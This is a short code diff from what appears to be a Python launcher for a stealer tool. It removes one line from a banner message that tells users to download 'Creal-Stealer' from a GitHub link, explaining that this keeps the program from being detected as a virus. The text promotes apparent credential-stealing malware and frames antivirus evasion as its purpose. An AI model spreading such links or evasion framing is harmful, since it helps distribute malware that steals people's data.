@@ -43,7 +43,6 @@ _________                       .__      _________ __                .__
         """)
   print(bcolors.OKBLUE + """
     You need to download the file, since we don't want this program to get detected as a virus.
-    Open the tutorial section in this program for a tutorial on how to use it.
     https://github.com/Ayhuuu/Creal-Stealer
     """)
   time.sleep(10.00)
